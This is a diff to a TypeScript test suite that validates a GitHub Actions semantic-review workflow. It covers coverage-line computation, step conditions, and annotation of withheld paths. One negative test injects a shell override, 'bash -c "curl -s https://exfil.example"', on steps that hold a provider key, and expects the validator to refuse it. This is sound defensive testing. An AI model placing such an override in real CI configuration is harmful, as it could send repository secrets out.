@@ -1807,6 +1807,41 @@ function assertCredentiallessScanner(candidate: UnknownRecord): void {
     }
 }
 
+/**
+ * Runs the workflow's own computing and annotating commands against a report written into a
+ * throwaway runner temp. The shipped scripts are what is observed, so the coverage line's tally and
+ * the notices are read back rather than restated, and a report the scripts mishandle is a failure
+ * here rather than a claim in a comment.
+ */
+function runSemanticCoverageLine(report: string): { coverage: string; notices: string; status: number | null } {
+    const directory = mkdtempSync(join(tmpdir(), 'sourdaw-semantic-coverage-'));
+    const reportDirectory = join(directory, 'semantic-review');
+    mkdirSync(reportDirectory, { recursive: true });
+    writeFileSync(join(reportDirectory, 'scan.json'), report);
+    const outputPath = join(directory, 'github-output');
+    writeFileSync(outputPath, '');
+    const compute = stepNamed(jobAt(semanticReviewWorkflow, 'assess'), 'Compute the coverage line');
+    const annotate = stepNamed(jobAt(semanticReviewWorkflow, 'coverage'), 'Publish the withheld paths');
+    const environment = { ...process.env, RUNNER_TEMP: directory };
+    const computeResult = spawnSync('bash', ['-c', stringAt(compute, 'run')], {
+        encoding: 'utf8',
+        env: { ...environment, GITHUB_OUTPUT: outputPath },
+        shell: false,
+    });
+    const annotateResult = spawnSync('bash', ['-c', stringAt(annotate, 'run')], {
+        encoding: 'utf8',
+        env: environment,
+        shell: false,
+    });
+    const coverage = readFileSync(outputPath, 'utf8');
+    rmSync(directory, { recursive: true, force: true });
+    return {
+        coverage,
+        notices: annotateResult.stdout,
+        status: computeResult.status === 0 ? annotateResult.status : computeResult.status,
+    };
+}
+
 describe('health gates workflow contract', () => {
     it('registers the hosted quantum producer contract in the global workflow set', () => {
         expect(() => assertHostedQuantumMeasurementWorkflow(hostedQuantumMeasurement)).not.toThrow();
@@ -2122,23 +2157,50 @@ describe('health gates workflow contract', () => {
         delete jobAt(outputless, 'assess').outputs;
         expect(() => assertSemanticReviewWorkflow(outputless)).toThrow('its single coverage output');
 
-        // The computing step must run on a red assessment too: deleting or
-        // widening its condition is the same empty name one step earlier.
+        // The computing step keeps the default success gate. A condition that
+        // would let it run after a failed report publishes a line derived from a
+        // report the upload step never published, so the coverage job could only
+        // contradict the name it was given. Both tempting conditions are refused.
         for (const [label, condition] of [
-            ['a dropped condition', undefined],
-            ['a widened condition', 'always()'],
+            ['a run-unless-cancelled condition', '${{ !cancelled() }}'],
+            ['an always condition', 'always()'],
         ] as const) {
             const gatedCoverage = structuredClone(semanticReviewWorkflow);
-            const compute = stepNamed(jobAt(gatedCoverage, 'assess'), 'Compute the coverage line');
-            if (condition === undefined) {
-                delete compute.if;
-            } else {
-                compute.if = condition;
-            }
+            stepNamed(jobAt(gatedCoverage, 'assess'), 'Compute the coverage line').if = condition;
             expect(
                 () => assertSemanticReviewWorkflow(gatedCoverage),
                 `${label} on the computing step must be refused`
             ).toThrow('no step condition beyond the job gate');
+        }
+
+        // The fallback belongs in the consumer's name expression. A job that
+        // never ran never evaluates its outputs mapping, so the old placement is
+        // what leaves the name empty on exactly the skipped and red runs it is
+        // meant to describe, and a name without the fallback is empty there too.
+        const fallbackInProducer = structuredClone(semanticReviewWorkflow);
+        recordAt(jobAt(fallbackInProducer, 'assess'), 'outputs').coverage =
+            "${{ steps.coverage.outputs.coverage || 'no assessment delivered' }}";
+        expect(() => assertSemanticReviewWorkflow(fallbackInProducer)).toThrow('its single coverage output');
+
+        const fallbacklessName = structuredClone(semanticReviewWorkflow);
+        jobAt(fallbacklessName, 'coverage').name = 'Jev coverage · ${{ needs.assess.outputs.coverage }}';
+        expect(() => assertSemanticReviewWorkflow(fallbacklessName)).toThrow(
+            'a coverage name built from the assessment output'
+        );
+
+        // A step's `shell` is executable and no command pin reads it, so a
+        // command appended there runs beside the pinned one with `run` unchanged
+        // — on the step that holds the provider key as much as any other.
+        for (const [jobId, stepName] of [
+            ['assess', 'Assess the change'],
+            ['coverage', 'Publish the withheld paths'],
+        ] as const) {
+            const shellInjection = structuredClone(semanticReviewWorkflow);
+            stepNamed(jobAt(shellInjection, jobId), stepName).shell = 'bash -c "curl -s https://exfil.example"';
+            expect(
+                () => assertSemanticReviewWorkflow(shellInjection),
+                `a shell override on ${jobId} ${stepName} must be refused`
+            ).toThrow('without a shell override');
         }
 
         // The output is read through the step id, so an id that drifts leaves
@@ -2166,6 +2228,37 @@ describe('health gates workflow contract', () => {
         expect(() => assertSemanticReviewWorkflow(keyInCoverage)).toThrow(
             'must mention a repository secret exactly once, on the assessment step'
         );
+    });
+
+    // Two withheld paths that differ only by a control character name two files. Deduplicating on the
+    // folded display value would merge them — a tab and a newline both fold to one space — dropping
+    // one from the count and pairing the survivor's notice with the wrong reason, so the shipped
+    // commands are executed here on exactly that report: both must be counted and both annotated,
+    // each with its own reason, with the control character folded only where the value is emitted.
+    it('counts and annotates withheld paths that differ only by a control character', () => {
+        const report = JSON.stringify({
+            execution: 'partial',
+            scope: {
+                discovered: 2,
+                eligible: 2,
+                assessed: 0,
+                cacheHits: 0,
+                excluded: [],
+                unassessed: [
+                    { path: 'src/one\ttwo.ts', reason: 'budget-exhausted-before-admission' },
+                    { path: 'src/one\ntwo.ts', reason: 'evidence-withheld-sensitive-path' },
+                ],
+                truncated: [],
+            },
+        });
+        const { coverage, notices, status } = runSemanticCoverageLine(report);
+        expect(status).toBe(0);
+        expect(coverage).toContain('2 withheld');
+        const annotations = notices.split('\n').filter((line) => line.startsWith('::notice file='));
+        expect(annotations).toHaveLength(2);
+        expect(annotations.join('\n')).toContain('src/one two.ts: budget-exhausted-before-admission');
+        expect(annotations.join('\n')).toContain('src/one two.ts: evidence-withheld-sensitive-path');
+        expect(notices).toContain('0 further withheld path(s) were not annotated.');
     });
     afterEach(() => {
         vi.unstubAllGlobals();
